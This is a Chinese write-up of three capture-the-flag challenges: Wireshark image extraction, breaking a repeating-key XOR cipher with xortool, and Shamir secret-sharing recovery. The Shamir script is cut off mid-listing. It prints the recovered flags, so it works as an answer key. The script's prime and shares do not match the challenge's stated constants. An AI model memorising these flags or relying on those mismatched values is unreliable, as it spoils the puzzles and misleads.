<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>折腾了半天<br>用wireshark打开，首先<strong>导出对象-&gt;http</strong>,如下图所示：<br><img src="https://i.imgur.com/Sta2aw4.png" alt=""><br>关注<strong>mime_multipart.type</strong>字段，仔细查看，发现了上传图片，于是将图片分离出来<br>具体步骤：选中图片信息的字段，<strong>右键导出分组</strong><br><img src="https://i.imgur.com/prDvD2A.png" alt=""><br>得到三张图：<br><img src="https://i.loli.net/2019/04/19/5cb918c66ab77.png" alt=""><br>第一张图把高度改为07 50，得到key：<br><img src="https://i.loli.net/2019/04/19/5cb918c66b135.png" alt=""><br>再将其他图片拿到数据包分析得出的地址：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a><br>去解密得到：<code>flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</code><br>再将<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">hex转ascii</a>：<code>lg+Hs-DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}+H-</code></p>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><blockquote>
<p>原文为英语，请破解</p>
<p>014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07</p>
</blockquote>
<p>将所给的字符串转为二进制文件：<code>echo &lt;上述字符串&gt;|xxd -r -ps&gt;test</code></p>
<blockquote>
<p>xxd // xxd 命令用于用二进制或十六进制显示文件的内容<br>-r // 把xxd的十六进制输出内容转换回原文件的二进制内容<br>-ps // 以 postscript的连续十六进制转储输出，这也叫做纯十六进制转储</p>
</blockquote>
<p>然后用<a href="https://github.com/hellman/xortool" target="_blank" rel="noopener">xortool</a>进行分析得到：</p>
<blockquote>
<p>$admin~&gt;python xortool -c 20 test<br>The most probable key lengths:<br>   3:   11.9%<br>   6:   19.7%<br>   9:   9.3%<br>  12:   14.5%<br>  15:   7.1%<br>  18:   11.2%<br>  21:   5.4%<br>  24:   8.4%<br>  30:   6.8%<br>  36:   5.7%<br>Key-length can be 3*n<br>2 possible key(s) of length 6:<br>\x0b\rz4\xaa\x12<br>N\rz4\xaa\x12<br>Found 2 plaintexts with 95.0%+ valid characters<br>See files filename-key.csv, filename-char_used-perc_valid.csv</p>
</blockquote>
<p>于是将得到的密钥与原文本进行xor：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">"014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b50c82033354e07ce236d694d02922a326b1f559370383b07"</span></span><br><span class="line">key=key.decode(<span class="string">"hex"</span>)</span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line">k=<span class="string">"\x0b\rz4\xaa\x12"</span>	<span class="comment">#N\rz4\xaa\x12</span></span><br><span class="line">for i in range(len(key)):</span><br><span class="line">  ans+=chr(ord(key[i])^ord(k[i%len(k)]))</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure></p>
<p>成功得到flag：DDCTF{07b1b46d1db28843d1fd76889fea9b36}</p>
<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><blockquote>
<p>为了共同的利益，【组织1】和【组织2】成立了联盟，并遵守共同约定的协议。为了让协议的制定和修改更加公<br>平，组织1和组织2共同决定：当三位以上【组织1】成员和三位以上【组织2】成员同意时，才可以制定或修改协<br>议。为了实现这一功能，联盟的印章被锁在密码保险柜中，而保险柜的密码只通过Shamir秘密分享方案分享给【组织<br>1】和【组织2】的每一位成员。<br>现在，【组织1】的【成员1】、【成员2】、【成员4】，【组织2】的【成员3】、【成员4】、【成员5】一致同<br>意制定新的协议。请还原出这套方案的设计思路，按照这套方案的思路恢复出保险柜密码，取出印章吧！</p>
<p>以下为使用到的7个十六进制常数：</p>
<p>p =<br>C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4<br>E32D331535F08FC6338748C8447E72763A07F8AF7<br>组织1成员1 =<br>30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF5000<br>0B74A8B8D572B253E63473A0916B69878A779946A<br>组织1成员2 =<br>1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3<br>C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7<br>组织1成员4 =<br>1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF654<br>6BD09720D5D5F3E7BC1A401C8BD7300C253927BBC<br>组织2成员3 =<br>300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E<br>77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA<br>组织2成员4 =<br>1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022<br>957B0C0584199F02790AAC61D7132F7DB6A8F77B9<br>组织2成员5 =<br>9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67C<br>A8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</p>
</blockquote>
<p><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing#Example" target="_blank" rel="noopener">shamir算法</a><br><a href="https://wenku.baidu.com/view/6f8ca4290066f5335a81215f.html" target="_blank" rel="noopener">简单解释</a><br>直接套用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">The following Python implementation of Shamir's Secret Sharing is</span></span><br><span class="line"><span class="string">released into the Public Domain under the terms of CC0 and OWFa:</span></span><br><span class="line"><span class="string">https://creativecommons.org/publicdomain/zero/1.0/</span></span><br><span class="line"><span class="string">http://www.openwebfoundation.org/legal/the-owf-1-0-agreements/owfa-1-0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">See the bottom few lines for usage. Tested on Python 2 and 3.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12th Mersenne Prime</span></span><br><span class="line"><span class="comment"># (for this application we want a known prime number as close as</span></span><br><span class="line"><span class="comment"># possible to our security level; e.g.  desired security level of 128</span></span><br><span class="line"><span class="comment"># bits -- too large and all the ciphertext is large; too small and</span></span><br><span class="line"><span class="comment"># security is compromised)</span></span><br><span class="line">_PRIME = <span class="number">2</span>**<span class="number">127</span> - <span class="number">1</span></span><br><span class="line"><span class="comment"># 13th Mersenne Prime is 2**521 - 1</span></span><br><span class="line"></span><br><span class="line">_RINT = functools.partial(random.SystemRandom().randint, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_eval_at</span><span class="params">(poly, x, prime)</span>:</span></span><br><span class="line">    <span class="string">'''evaluates polynomial (coefficient tuple) at x, used to generate a</span></span><br><span class="line"><span class="string">    shamir pool in make_random_shares below.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    accum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> coeff <span class="keyword">in</span> reversed(poly):</span><br><span class="line">        accum *= x</span><br><span class="line">        accum += coeff</span><br><span class="line">        accum %= prime</span><br><span class="line">    <span class="keyword">return</span> accum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_random_shares</span><span class="params">(minimum, shares, prime=_PRIME)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Generates a random shamir pool, returns the secret and the share</span></span><br><span class="line"><span class="string">    points.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> minimum &gt; shares:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"pool secret would be irrecoverable"</span>)</span><br><span class="line">    poly = [_RINT(prime) <span class="keyword">for</span> i <span class="keyword">in</span> range(minimum)]</span><br><span class="line">    points = [(i, _eval_at(poly, i, prime))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, shares + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> poly[<span class="number">0</span>], points</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_extended_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    division in integers modulus p means finding the inverse of the</span></span><br><span class="line"><span class="string">    denominator modulo p and then multiplying the numerator by this</span></span><br><span class="line"><span class="string">    inverse (Note: inverse of A is B such that A*B % p == 1) this can</span></span><br><span class="line"><span class="string">    be computed via extended Euclidean algorithm</span></span><br><span class="line"><span class="string">    http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Computation</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    last_x = <span class="number">1</span></span><br><span class="line">    y = <span class="number">1</span></span><br><span class="line">    last_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        quot = a // b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x, last_x = last_x - quot * x, x</span><br><span class="line">        y, last_y = last_y - quot * y, y</span><br><span class="line">    <span class="keyword">return</span> last_x, last_y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_divmod</span><span class="params">(num, den, p)</span>:</span></span><br><span class="line">    <span class="string">'''compute num / den modulo prime p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    To explain what this means, the return value will be such that</span></span><br><span class="line"><span class="string">    the following is true: den * _divmod(num, den, p) % p == num</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    inv, _ = _extended_gcd(den, p)</span><br><span class="line">    <span class="keyword">return</span> num * inv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_lagrange_interpolate</span><span class="params">(x, x_s, y_s, p)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Find the y-value for the given x, given n (x, y) points;</span></span><br><span class="line"><span class="string">    k points will define a polynomial of up to kth order</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    k = len(x_s)</span><br><span class="line">    <span class="keyword">assert</span> k == len(set(x_s)), <span class="string">"points must be distinct"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PI</span><span class="params">(vals)</span>:</span>  <span class="comment"># upper-case PI -- product of inputs</span></span><br><span class="line">        accum = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> vals:</span><br><span class="line">            accum *= v</span><br><span class="line">        <span class="keyword">return</span> accum</span><br><span class="line">    nums = []  <span class="comment"># avoid inexact division</span></span><br><span class="line">    dens = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        others = list(x_s)</span><br><span class="line">        cur = others.pop(i)</span><br><span class="line">        nums.append(PI(x - o <span class="keyword">for</span> o <span class="keyword">in</span> others))</span><br><span class="line">        dens.append(PI(cur - o <span class="keyword">for</span> o <span class="keyword">in</span> others))</span><br><span class="line">    den = PI(dens)</span><br><span class="line">    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)</span><br><span class="line">               <span class="keyword">for</span> i <span class="keyword">in</span> range(k)])</span><br><span class="line">    <span class="keyword">return</span> (_divmod(num, den, p) + p) % p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_secret</span><span class="params">(shares, prime=_PRIME)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Recover the secret from share points</span></span><br><span class="line"><span class="string">    (x,y points on the polynomial)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> len(shares) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"need at least two shares"</span>)</span><br><span class="line">    x_s, y_s = zip(*shares)</span><br><span class="line">    <span class="keyword">return</span> _lagrange_interpolate(<span class="number">0</span>, x_s, y_s, prime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p=<span class="number">0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span></span><br><span class="line">    a1=(<span class="number">1</span>,<span class="number">0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E</span>)</span><br><span class="line">    a2=(<span class="number">2</span>,<span class="number">0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6</span>)</span><br><span class="line">    a4=(<span class="number">4</span>,<span 